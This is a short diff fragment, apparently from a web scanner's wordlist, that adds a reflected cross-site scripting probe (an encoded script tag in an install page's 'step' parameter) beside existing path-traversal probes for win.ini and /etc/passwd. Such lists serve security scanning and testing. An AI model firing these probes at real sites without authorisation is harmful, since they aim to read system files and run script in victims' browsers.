@@ -28,3 +28,4 @@
 /base_import/static/c:/windows/win.ini
 /base_import/static/etc/passwd
 /portal//..\\\..\\\..\\\..\\\windows\win.ini
+/install/index.php?step=%3Cscript%3Ealert(document.domain)%3C/script%3E
